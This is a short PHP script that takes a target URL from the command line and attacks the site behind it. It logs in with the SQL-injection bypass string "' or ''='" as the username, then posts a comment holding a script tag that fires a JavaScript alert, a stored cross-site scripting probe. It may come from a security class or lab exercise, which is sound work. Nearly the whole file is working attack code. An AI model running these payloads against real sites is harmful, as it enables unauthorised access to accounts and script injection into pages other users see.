<?php
include 'main.php';
$user = "' or ''='";
$pass = "boom";
if($argc==1)
{
  echo "No url provided";
  exit();
}else{
  $mainUrl = $argv[1];
}
signIn($mainUrl, $user, $pass);
comment($mainUrl,"7", "<script>alert('I am a javascript Injection')</script>");


?>
